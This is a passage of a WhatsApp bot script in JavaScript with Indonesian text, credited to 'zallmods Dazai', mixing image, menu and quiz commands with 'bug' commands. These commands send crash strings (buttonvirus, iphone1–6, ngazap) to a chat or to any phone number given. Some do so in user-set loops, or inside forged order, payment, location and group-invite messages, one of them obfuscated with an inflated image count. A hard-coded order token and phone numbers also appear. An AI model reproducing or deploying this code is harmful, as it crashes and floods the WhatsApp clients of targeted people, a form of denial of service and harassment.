let ghd = await zallmods.sendMessage(from,{audio:{url: res.url[1].url}, mimetype: "audio/mp4", ptt:false},{quoted:m})
}
break
case 'hw1': {
zallmods.sendMessage(from, { image: hw1,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw2': {
zallmods.sendMessage(from, { image: hw2,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw3': {
zallmods.sendMessage(from, { image: hw3,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw4': {
zallmods.sendMessage(from, { image: hw4,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw5': {
zallmods.sendMessage(from, { image: hw5,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw6': {
zallmods.sendMessage(from, { image: hw6,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw7': {
zallmods.sendMessage(from, { image: hw7,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw8': {
zallmods.sendMessage(from, { image: hw8,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw9': {
zallmods.sendMessage(from, { image: hw9,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw10': {
zallmods.sendMessage(from, { image: hw10,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw11': {
zallmods.sendMessage(from, { image: hw11,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw12': {
zallmods.sendMessage(from, { image: hw12,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw13': {
zallmods.sendMessage(from, { image: hw13,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw14': {
zallmods.sendMessage(from, { image: hw14,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw15': {
zallmods.sendMessage(from, { image: hw15,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw16': {
zallmods.sendMessage(from, { image: hw16,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw17': {
zallmods.sendMessage(from, { image: hw17,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw18': {
zallmods.sendMessage(from, { image: hw18,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw19': {
zallmods.sendMessage(from, { image: hw19,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw20': {
zallmods.sendMessage(from, { image: hw20,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw21': {
zallmods.sendMessage(from, { image: hw21,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw22': {
zallmods.sendMessage(from, { image: hw22,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw23': {
zallmods.sendMessage(from, { image: hw23,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw24': {
zallmods.sendMessage(from, { image: hw24,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw25': {
zallmods.sendMessage(from, { image: hw25,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw26': {
zallmods.sendMessage(from, { image: hw26,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw27': {
zallmods.sendMessage(from, { image: hw27,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw28': {
zallmods.sendMessage(from, { image: hw28,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw29': {
zallmods.sendMessage(from, { image: hw29,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw30': {
zallmods.sendMessage(from, { image: hw30,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw31': {
zallmods.sendMessage(from, { image: hw31,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw32': {
zallmods.sendMessage(from, { image: hw32,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw33': {
zallmods.sendMessage(from, { image: hw33,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw34': {
zallmods.sendMessage(from, { image: hw34,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw35': {
zallmods.sendMessage(from, { image: hw35,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw36': {
zallmods.sendMessage(from, { image: hw36,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw37': {
zallmods.sendMessage(from, { image: hw37,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw38': {
zallmods.sendMessage(from, { image: hw38,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw39': {
zallmods.sendMessage(from, { image: hw39,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw40': {
zallmods.sendMessage(from, { image: hw40,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw41': {
zallmods.sendMessage(from, { image: hw41,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw42': {
zallmods.sendMessage(from, { image: hw42,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw43': {
zallmods.sendMessage(from, { image: hw43,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw44': {
zallmods.sendMessage(from, { image: hw44,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw45': {
zallmods.sendMessage(from, { image: hw45,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw46': {
zallmods.sendMessage(from, { image: hw46,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw47': {
zallmods.sendMessage(from, { image: hw47,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw48': {
zallmods.sendMessage(from, { image: hw48,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw49': {
zallmods.sendMessage(from, { image: hw49,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw50': {
zallmods.sendMessage(from, { image: hw50,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw51': {
zallmods.sendMessage(from, { image: hw51,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw52': {
zallmods.sendMessage(from, { image: hw52,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw53': {
zallmods.sendMessage(from, { image: hw53,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw54': {
zallmods.sendMessage(from, { image: hw54,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw55': {
zallmods.sendMessage(from, { image: hw55,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw56': {
zallmods.sendMessage(from, { image: hw56,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw57': {
zallmods.sendMessage(from, { image: hw57,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw58': {
zallmods.sendMessage(from, { image: hw58,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw59': {
zallmods.sendMessage(from, { image: hw59,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw60': {
zallmods.sendMessage(from, { image: hw60,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw61': {
zallmods.sendMessage(from, { image: hw61,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw62': {
zallmods.sendMessage(from, { image: hw62,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw63': {
zallmods.sendMessage(from, { image: hw63,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw64': {
zallmods.sendMessage(from, { image: hw64,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw65': {
zallmods.sendMessage(from, { image: hw65,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw66': {
zallmods.sendMessage(from, { image: hw66,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw67': {
zallmods.sendMessage(from, { image: hw67,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw68': {
zallmods.sendMessage(from, { image: hw68,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw69': {
zallmods.sendMessage(from, { image: hw69,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw70': {
zallmods.sendMessage(from, { image: hw70,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw71': {
zallmods.sendMessage(from, { image: hw71,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw72': {
zallmods.sendMessage(from, { image: hw72,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw73': {
zallmods.sendMessage(from, { image: hw73,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw74': {
zallmods.sendMessage(from, { image: hw74,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw75': {
zallmods.sendMessage(from, { image: hw75,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw76': {
zallmods.sendMessage(from, { image: hw76,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw77': {
zallmods.sendMessage(from, { image: hw77,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw78': {
zallmods.sendMessage(from, { image: hw78,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
case 'hw79': {
zallmods.sendMessage(from, { image: hw79,  caption: `© Created By zallmods Dazai` }, { quoted:m })
}
break
//=================================================//
case 'listaudio':
...
Semoga Kalian Suka 🥳`, zallmods.user.name, `Hay Kak Audio Ada Di List Yah`, `Click Here 🌷`, touchmebree, m)
break
case 'listlogo':
touchmebree = [
{
...
Semoga Kalian Suka 🥳`, zallmods.user.name, `Hay Kak Logo Picture Ada Di List Yah`, `Click Here 🌷`, touchmebree, m)
break
...
zallmods.sendListMsg(from, `
LIST JUALAN AMGEEKZ `, zallmods.user.name, `Sitting equally, there is no king or lord, because we live only Gods creation from a clod of soil`, `Click Here 🌷`, touchmebree, m)
}
break
case 'apkamgeekz': {
touchmebree = [
...
zallmods.sendListMsg(from, `
APLIKASI AMGEEKZ `, zallmods.user.name, `MEMPERMUDAH KALIAN AKSES WEB AMGEEKZ AGAR TIDAL PERLU REPOT MEMBUKA GOOGLE`, `Click Here 🌷`, touchmebree, m)
}
break
case 'layanan':{
touchmebree = [
...
zallmods.sendListMsg(from, `
 SYARAT KETENTUAN LAYANAN AMGEEKZ YANG BERLAKU`, zallmods.user.name, `Sitting equally, there is no king or lord, because we live only Gods creation from a clod of soil`, `Click Here 🌷`, touchmebree, m)
}
break
case 'payment':{
touchmebree = [
...
Semoga Kalian Suka 🥳`, zallmods.user.name, `Hay Kak Pembayaran Ada Di List`, `Click Here 🌷`, touchmebree, m)
}
break
//=================================================//
case 'listwibu':
...
Semoga Kalian Suka 🥳`, zallmods.user.name, `Hay Kak Wibu Picture Ada Di List Yah`, `Click Here 🌷`, touchmebree, m)
break
case 'listban':
if (!isCreator) return m.reply(mess.owner)
touchmebree = [
...
Semoga Kalian Suka 🥳`, zallmods.user.name, `Hay Kak List Ban Bot Ada Di List`, `Click Here 🌷`, touchmebree, m)
break
      case 'setadmin': {
      if (!isCreator) return m.reply(mess.owner)
...
{title: "zallmods Dazai ✅", rowId: `${prefix}setadmin hwmods`, description: `ONLINE`},
...
zallmods.sendListMsg(from, `Settings Online Admin Panel Amgeekz`, zallmods.user.name, `Hello Owner !`, `Click Here`, sections, m)
}
    }
    break
    case 'listadmin': {
 let setbot = global.db.data.settings[botNumber]
if (setbot.inod) {
zallmods.sendMessage(from, { image: ppnyauser, caption: `*List Admin AmGeekz⚡* :
...
zallmods.sendMessage(from, { image: ppnyauser, caption: `*SERVER PENUH*` }, { quoted:m })
} else if (setbot.offkabeh1) {
zallmods.sendMessage(from, { image: ppnyauser, caption: `*MAINTENANCE*` }, { quoted:m })
} 
     }
    break
case 'inspect': {
...
©By zallmods Dazai`
try {
pp = await zallmods.profilePictureUrl(res.content[0].attrs.id + "@g.us", "image")
} catch {
pp = "https://tse2.mm.bing.net/th?id=OIP.n1C1oxOvYLLyDIavrBFoNQHaHa&pid=Api&P=0&w=153&h=153"
}
zallmods.sendFile(from, pp, "", m, { caption: tekse, mentions: await zallmods.parseMention(tekse) })
sticSukses(from)
})
}
break
...
let teks = `${q}`
{
a = await zallmods.sendMessage(from, {react: {  key: { remoteJid: from, fromMe: true, id : m.key.id}}})
...
"message": `${teks}`,
"orderTitle": `${teks}`,
"sellerJid": "6281378169657@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m })
zallmods.relayMessage(from, order.message, { messageId: order.key.id })
sticSukses(from)
}
}
break
...
let teks = `${q}`
{
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: zallmods.waUploadToServer })
...
zallmods.relayMessage(from, liveLocation.message, { messageId: liveLocation.key.id })
sticSukses(from)
}
}
break
//=================================================//
case 'jazallmodstalog': {
if (!isCreator) return m.reply(mess.owner)
if (!quoted) throw 'Reply Image/sticker'
let teks = `${q}`
{
function _0x348d(_0x50ce67,_0x2397a1){var _0x15bb19=_0x15bb();return _0x348d=function(_0x348dc9,_0x408474){_0x348dc9=_0x348dc9-0x173;var _0x50d082=_0x15bb19[_0x348dc9];return _0x50d082;},_0x348d(_0x50ce67,_0x2397a1);}var _0x7bda59=_0x348d;(function(_0x2b7a6b,_0x258fac){var _0x3a2d72=_0x348d,_0x26e08e=_0x2b7a6b();while(!![]){try{var _0x574dc3=-parseInt(_0x3a2d72(0x179))/0x1+-parseInt(_0x3a2d72(0x183))/0x2+-parseInt(_0x3a2d72(0x176))/0x3+parseInt(_0x3a2d72(0x17e))/0x4+-parseInt(_0x3a2d72(0x182))/0x5+parseInt(_0x3a2d72(0x180))/0x6+-parseInt(_0x3a2d72(0x173))/0x7;if(_0x574dc3===_0x258fac)break;else _0x26e08e['push'](_0x26e08e['shift']());}catch(_0x36dddf){_0x26e08e['push'](_0x26e08e['shift']());}}}(_0x15bb,0xac052));let media=await quoted[_0x7bda59(0x17d)](quoted);function _0x15bb(){var _0x1beac5=['586320XahqHr','chat','waUploadToServer','key','download','5612456xbkxWC','message','6419334pqEaRs','HW\x20MODS\x20WA\x20','1899640aXNWfS','473494FRUydx','3030587FfNbLm','Message','wa.me/6281378169657','397419wzTxRp','6281378169657@s.whatsapp.net','fromObject'];_0x15bb=function(){return _0x1beac5;};return _0x15bb();}var messa=await prepareWAMessageMedia({'image':media},{'upload':zallmods[_0x7bda59(0x17b)]}),catalog=generateWAMessageFromContent(m['chat'],proto[_0x7bda59(0x174)][_0x7bda59(0x178)]({'productMessage':{'product':{'productImage':messa['imageMessage'],'productId':'','jpegThumbnail':ppnyauser,'title':text+'\x20'+buttonkal,'description':text+'\x20'+buttonkal,'productImageCount':0x3b9ac9ff,'firstImageId':0x1,'retailerId':_0x7bda59(0x181)+bugsw,'bodyText':''+text,'footerText':''+text,'url':_0x7bda59(0x175)},'businessOwnerJid':_0x7bda59(0x177),'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}}),{'userJid':m[_0x7bda59(0x17a)],'quoted':m});zallmods['relayMessage'](m[_0x7bda59(0x17a)],catalog[_0x7bda59(0x17f)],{'messageId':catalog[_0x7bda59(0x17c)]['id']});
sticSukses(from)
}
}
break
...
let teks = `${q}`
{
zallmods.sendMessage(from, { image: ppnyauser, caption: `🔥 ${teks} ${iphone}` }, { quoted:m })
sticSukses(from)
}
}
break
...
let teks = `${q}`
{
zallmods.sendMessage(from, { image: ppnyauser, caption: `🔥 ${teks} ${iphone1}` }, { quoted:m })
sticSukses(from)
}
}
break
...
let teks = `${q}`
{
zallmods.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone2}` }, { quoted:m })
sticSukses(from)
}
}
break
...
let teks = `${q}`
{
zallmods.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone3}` }, { quoted:m })
sticSukses(from)
}
}
break
...
let teks = `${q}`
{
zallmods.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone4}` }, { quoted:m })
sticSukses(from)
}
}
break
...
let teks = `${q}`
{
zallmods.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone5}` }, { quoted:m })
sticSukses(from)
}
}
break
...
let teks = `${q}`
{
zallmods.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone6}` }, { quoted:m })
sticSukses(from)
}
}
break
...
let teks = `${q}`
{
zallmods.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${buttonkal}` }, { quoted:m })
sticSukses(from)
}
}
break
...
let teks = `${q}`
{
zallmods.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${buttonvirus}` }, { quoted:m })
sticSukses(from)
}
}
break
...
let teks = `${q}`
{
zallmods.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${ngazap(prefix)}`}, { quoted:m })
sticSukses(from)
}
}
break
...
zallmods.relayMessage(from, groupInvite.message, { messageId: groupInvite.key.id })
sticSukses(from)
}
}
break
...
let teks = `${q}`
{
zallmods.relayMessage(from, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `DEVELOPER zallmods Dazai`,"body": `Selamat ${salam} kak ${pushname}`,
mimetype: 'audio/mpeg', caption: `🔥 ${teks} ${buttonkal}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/EDz-`,
...
let teks = `${q}`
{
joau = fs.readFileSync('./baseikal/video/zallmods.mp4')
zallmods.sendMessage(from, { video: joau, mimetype: 'video/mp4', caption: `🔥 ${teks} ${buttonkal}` }, { quoted:m })
sticSukses(from)
}
}
break
...
zallmods.sendMessage(from, buttonnnnmMessage)
sticSukses(from)
}
 break
//=================================================//
...
touchmebre = [
{
title: `🌷 zallmods Dazai WA 🌷 ${buttonvirus} ${buttonvirus}`,
rows: [
...
zallmods.sendListMsg(bnnd, `🌷 zallmods Dazai WA 🌷`, zallmods.user.name, `Hay Kak Sc Bot Adia Di List`, `Click Here 🌷`, touchmebre, m)
sticSukses(from)
break
//=================================================//
...
"status": "INQUIRY",
"surface": "CATALOG",
"message": " BY zallmods Dazai",
"orderTitle": " BUG TROLI ", // 
"sellerJid": "6281378169657@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
zallmods.relayMessage(bnnd, order.message, { messageId: order.key.id })
sticSukses(from)
}
break
//=================================================//
...
zallmods.relayMessage(bnnd, document.message, { messageId: document.key.id })
sticSukses(from)
}
break
//=================================================//
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
zallmods.sendMessage(from, { image: ppnyauser,  caption: `zallmods Dazai${iphone}` }, { quoted:m })
sticSukses(from)
}
}
break
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
zallmods.sendMessage(from, { image: ppnyauser,  caption: `zallmods Dazai${iphone1}` }, { quoted:m })
sticSukses(from)
}
}
break
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
zallmods.sendMessage(from, { image: ppnyauser,  caption: `zallmods Dazai${iphone2}` }, { quoted:m })
sticSukses(from)
}
}
break
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
zallmods.sendMessage(from, { image: ppnyauser,  caption: `zallmods Dazai${iphone3}` }, { quoted:m })
sticSukses(from)
}
}
break
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
zallmods.sendMessage(from, { image: ppnyauser,  caption: `zallmods Dazai${iphone4}` }, { quoted:m })
sticSukses(from)
}
}
break
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
zallmods.sendMessage(from, { image: ppnyauser,  caption: `zallmods Dazai${iphone5}` }, { quoted:m })
sticSukses(from)
}
}
break
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
zallmods.sendMessage(from, { image: ppnyauser,  caption: `zallmods Dazai${iphone6}` }, { quoted:m })
sticSukses(from)
}
}
break
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
zallmods.sendMessage(from, { image: ppnyauser,  caption: `zallmods Dazai${buttonkal}` }, { quoted:m })
sticSukses(from)
}
}
break
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
zallmods.sendMessage(from, { image: ppnyauser,  caption: `zallmods Dazai${buttonvirus}` }, { quoted:m })
sticSukses(from)
}
}
break
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
zallmods.sendMessage(from, { image: ppnyauser,  caption: `zallmods Dazai${ngazap(prefix)}`}, { quoted:m })
sticSukses(from)
}
}
break
...
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281378169657`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
zallmods.sendMessage(bnnd, { image: ppnyauser,  caption: `zallmods Dazai${iphone}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
...
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281378169657`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
zallmods.sendMessage(bnnd, { image: ppnyauser,  caption: `zallmods Dazai${iphone1}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
...
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281378169657`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
zallmods.sendMessage(bnnd, { image: ppnyauser,  caption: `zallmods Dazai${iphone2}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
...
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281378169657`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
zallmods.sendMessage(bnnd, { image: ppnyauser,  caption: `zallmods Dazai${iphone3}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
...
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281378169657`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
zallmods.sendMessage(bnnd, { image: ppnyauser,  caption: `zallmods Dazai${iphone4}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
...
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281378169657`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
zallmods.sendMessage(bnnd, { image: ppnyauser,  caption: `zallmods Dazai${iphone5}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
...
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281378169657`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
zallmods.sendMessage(bnnd, { image: ppnyauser,  caption: `zallmods Dazai${iphone6}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
...
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281378169657`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
zallmods.sendMessage(bnnd, { image: ppnyauser,  caption: `zallmods Dazai${buttonkal}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
...
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281378169657`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
zallmods.sendMessage(bnnd, { image: ppnyauser,  caption: `zallmods Dazai${buttonvirus}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
...
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281378169657`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
zallmods.sendMessage(bnnd, { image: ppnyauser,  caption: `zallmods Dazai${ngazap(prefix)}`}, { quoted:m })
sticSukses(from)
}
break
//=================================================//
...
image: virgam,
mimetype: 'image/jpeg',
 caption: `zallmods Dazai`,
footer: ` ${ngazap(prefix)} `,
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281378169657'}},
...
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `© zallmods Dazai${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted:m})
zallmods.relayMessage(bnnd, liveLocation.message, { messageId: liveLocation.key.id })
sticSukses(from)
}
break
//=================================================//
...
zallmods.relayMessage(bnnd, location.message, { messageId: location.key.id })
sticSukses(from)
}
break
//=================================================//
...
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© zallmods Dazai${ngazap(prefix)}`,
"jpegThumbnail":fs.readFileSync('./baseikal/image/pict.jpg'),
"orderTitle": `© zallmods Dazai${ngazap(prefix)}`,
...
zallmods.sendMessage(from, buttonMessage)
sticSukses(from)
}
 break
//=================================================//
...
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER zallmods Dazai`,
}
}}), { userJid: from, quoted:m})
zallmods.relayMessage(bnnd, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
sticSukses(from)
}
break
//=================================================//
...
ydd = `Hallo Aku zallmods`
for (let i = 0; i < jumlah; i++) {
zallmods.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `DEVELOPER zallmods Dazai`,"body": `Selamat ${salam} kak ${pushname}`,
...
case 'buggastick':{
if (!isCreator) return m.reply(mess.owner)
zallmods.sendImageAsSticker(from, fs.readFileSync('./baseikal/stickernye/SuksesCok.webp'), m, { packname: global.packname, author: global.author, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6281378169657',
title: `${buttonvirus}`,
sourceUrl: `https://wa.me/6281378169657`, 
thumbnail: virgam
}
}}, { text:`haha` }, { quoted: m})
}
...
case 'buggamvn':{
if (!isCreator) return m.reply(mess.owner)
zallmods.sendMessage(from, {audio: fs.readFileSync('./baseikal/sound/ketawa.mp3'), mimetype:'audio/mpeg', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6281378169657',
title: `zallmods Dazai`,
sourceUrl: `https://wa.me/6281378169657`, 
thumbnail: virgam
}
}}, { text:`haha` }, { quoted: m})
...
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME zallmods Dazai${ngazap(prefix)}`,
"groupName": `MY NAME zallmods Dazai${ngazap(prefix)}`,
"caption": `${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted:m})
zallmods.relayMessage(bnnd, groupInvite.message, { messageId: groupInvite.key.id })
...
break
    ...
    if (!isCreator) return m.reply(mess.owner)
                ...
                _family100['family100'+from] = {
                    id: 'family100'+from,
                    pesan: await zallmods.sendText(from, hasil, m),
                    ...random,
            ...
            if (!isCreator) return m.reply(mess.owner)
                ...
                if (args[0] === "lagu") {
                    ...
                    let msg = await zallmods.sendMessage(from, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
                    zallmods.sendText(from, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
                    tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    zallmods.sendButtonText(from, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, zallmods.user.name, m)
                    delete tebaklagu[m.sender.split('@')[0]]
                    }
                    ...
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    zallmods.sendImage(from, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
                    tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    zallmods.sendButtonText(from, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, zallmods.user.name, m)
                    delete tebakgambar[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kata') {
                    ...
                    let result = anu[Math.floor(Math.random() * anu.length)]
